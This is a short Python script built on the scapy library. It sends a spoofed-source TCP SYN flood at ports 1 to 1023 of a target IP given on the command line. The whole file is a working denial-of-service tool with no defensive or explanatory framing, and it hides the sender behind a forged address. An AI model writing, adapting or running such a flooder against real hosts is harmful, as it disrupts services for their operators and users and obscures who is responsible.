#!/usr/bin/python 

import sys
from scapy.all import srflood, IP, TCP

if len(sys.argv) < 3:
	print sys.argv[0] + " <spoofIP><targetIP>"
	sys.exit(0)

packet = IP(src=sys.argv[1], dst=sys.argv[2]) / \
	TCP(dport=range(1, 1024), flags="S")

srflood(packet, store=0)
